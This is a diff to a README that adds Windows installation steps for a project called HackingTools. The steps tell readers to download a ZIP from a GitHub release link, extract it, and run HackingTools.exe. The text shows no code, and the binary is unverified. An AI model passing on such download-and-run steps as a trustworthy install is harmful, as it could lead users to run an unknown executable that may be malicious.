@@ -57,19 +57,25 @@ Before you begin, ensure you have the following installed:
 ### Installation
 
 **Installation (Windows only)**
+
 Download the ZIP file
+
 Click here to download HackingTools.zip
+
 [Click here to download HackingTools.zip](https://github.com/BlackHatzzz/HackingTools/releases/download/HackingTools/HackingTools.zip)
 
 Extract the ZIP file
+
 Right-click the downloaded file and select "Extract All...". Choose a destination folder to extract the files.
 
 Open the extracted folder
+
 Navigate to the folder where you extracted the files (e.g., HackingTools).
 
 ### Usage
 
 **Run HackingTools.exe:**
+
 Run the application
 
 Inside the extracted folder, double-click the .exe file to launch the tool.
